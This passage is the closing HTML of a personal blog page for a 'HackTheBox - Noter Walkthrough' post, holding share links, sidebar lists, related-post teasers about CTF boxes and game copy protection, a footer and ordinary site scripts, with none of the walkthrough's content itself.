href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox%20-%20Noter%20Walkthrough%20-%20Jayden%20Lind%20-%20Portfolio&u=https%3A%2F%2Fjayden-lind.github.io%2Fposts%2Fhtb-noter%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fjayden-lind.github.io%2Fposts%2Fhtb-noter%2F&text=HackTheBox%20-%20Noter%20Walkthrough%20-%20Jayden%20Lind%20-%20Portfolio" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/taz/">Breaking 20 year old PC game copy protection</a><li><a href="/posts/htb-retired/">HackTheBox - Retired</a><li><a href="/posts/linds-zabbix/">Monitoring homelab with Zabbix</a><li><a href="/posts/linds-terraform/">Implementing Terraform with vSphere</a><li><a href="/posts/linds-kubernetes/">Moving to Kubernetes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/security/">Security</a> <a class="post-tag" href="/tags/terraform/">terraform</a> <a class="post-tag" href="/tags/zabbix/">zabbix</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-opensource/"><div class="card-body"> <em class="small" data-ts="1654005600" data-df="ll" > Jun 1, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - OpenSource</h3><div class="text-muted small"><p> HTB - OpenSource walkthrough OpenSource was a harder than initially thought box, I got lost in some rabbit holes, such as escaping the docker container, the Werkzueg console etc. Even though this ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-retired/"><div class="card-body"> <em class="small" data-ts="1655820000" data-df="ll" > Jun 22, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Retired</h3><div class="text-muted small"><p> HTB - Retired walkthrough Retired box is a medium rated difficulty box, but for me personally it was a hard box. I’ve never done any sort of binary exploitation before and because of that, this ...</p></div></div></a></div><div class="card"> <a href="/posts/taz/"><div class="card-body"> <em class="small" data-ts="1679230800" data-df="ll" > Mar 20, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Breaking 20 year old PC game copy protection</h3><div class="text-muted small"><p> Introduction As a kid, I used to play Taz: Wanted on my PC, but nowadays it’s impossible to play these old games as most modern PCs don’t have a CD drive. While you can easily download no-CD crack...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/cert-edgemax/" class="btn btn-outline-primary" prompt="Older"><p>Creating Certificate for EdgeMAX device</p></a> <a href="/posts/htb-opensource/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - OpenSource</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/security/">Security</a> <a class="post-tag" href="/tags/terraform/">terraform</a> <a class="post-tag" href="/tags/zabbix/">zabbix</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/jayden-lind">jayden-lind</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-BZK4D02L4Z"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-BZK4D02L4Z', {'cookie_expires': 0 }); }); </script>
